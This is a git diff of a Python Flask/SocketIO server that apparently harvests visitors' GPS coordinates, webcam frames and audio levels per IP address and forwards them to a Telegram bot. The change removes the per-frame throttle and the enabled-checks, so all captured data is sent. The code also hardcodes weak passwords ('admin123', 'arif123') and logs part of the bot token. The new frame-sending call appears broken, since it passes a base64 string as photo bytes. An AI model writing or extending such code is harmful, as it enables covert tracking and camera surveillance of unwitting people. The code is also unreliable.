@@ -10,25 +10,31 @@ bp = Blueprint('random_route', __name__, url_prefix='/random')
 ADMIN_PASSWORD = 'admin123'
 CLEAR_PASSWORD = 'arif123'
 
-# ========== এডমিন টেলিগ্রাম বট (সার্ভার সাইড) ==========
-ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT_TOKEN')   # আলাদা এনভায়রনমেন্ট
+ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT_TOKEN')
 ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID')
 ADMIN_BOT_ENABLED = bool(ADMIN_BOT_TOKEN and ADMIN_CHAT_ID)
+
+print(f"🔍 Admin Bot Enabled: {ADMIN_BOT_ENABLED}")
+if ADMIN_BOT_ENABLED:
+    print(f"🔍 Token: {ADMIN_BOT_TOKEN[:5]}... Chat ID: {ADMIN_CHAT_ID}")
 
 clients = {}
 
 def send_admin_telegram(text, photo_bytes=None):
     if not ADMIN_BOT_ENABLED:
+        print("⚠️ Admin bot not enabled")
         return
     try:
         if photo_bytes:
             url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
-            requests.post(url, data={'chat_id': ADMIN_CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
+            response = requests.post(url, data={'chat_id': ADMIN_CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
+            print(f"📸 Photo sent: {response.status_code}")
         else:
             url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
-            requests.post(url, data={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
+            response = requests.post(url, data={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
+            print(f"📨 Message sent: {response.status_code}")
     except Exception as e:
-        print(f"Admin Telegram error: {e}")
+        print(f"❌ Telegram error: {e}")
 
 # ========== ওয়েব রাউট ==========
 @bp.route('/')
@@ -79,7 +85,6 @@ def handle_connect():
         clients[ip]['offline'] = False
         clients[ip]['user_agent'] = ua
 
-    # ড্যাশবোর্ডে সব সময় আপডেট পাঠাও (এডমিন বট অন থাকলেও ড্যাশবোর্ড চলবে)
     emit_admin_update()
     emit_public_update()
 
@@ -106,11 +111,7 @@ def handle_location(data):
     if ip in clients:
         clients[ip]['location'] = data
         clients[ip]['offline'] = False
-        
-        # এডমিন বটে পাঠাও (যদি সক্রিয় থাকে)
-        if ADMIN_BOT_ENABLED:
-            send_admin_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
-        
+        send_admin_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
         emit_admin_update()
         emit_public_update()
 
@@ -124,19 +125,7 @@ def handle_video(data):
         clients[ip]['last_frame'] = image
         clients[ip]['audio_level'] = audio
         clients[ip]['offline'] = False
-        
-        # এডমিন বটে ফটো পাঠাও (প্রতি ৫ম ফ্রেম)
-        if ADMIN_BOT_ENABLED:
-            if not hasattr(handle_video, 'counter'):
-                handle_video.counter = 0
-            handle_video.counter += 1
-            if handle_video.counter % 5 == 0 and image:
-                try:
-                    img_bytes = base64.b64decode(image.split(',')[1])
-                    send_admin_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", photo_bytes=img_bytes)
-                except:
-                    pass
-        
+        send_admin_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", image)
         emit_admin_update()
         emit_public_update()
 
@@ -170,8 +159,7 @@ def handle_clear(data):
     if data.get('password') == CLEAR_PASSWORD:
         clients.clear()
         emit('clear_all', broadcast=True)
-        if ADMIN_BOT_ENABLED:
-            send_admin_telegram("🗑️ All data cleared by admin")
+        send_admin_telegram("🗑️ All data cleared by admin")
         emit_admin_update()
         return {'status': 'ok'}
     else:
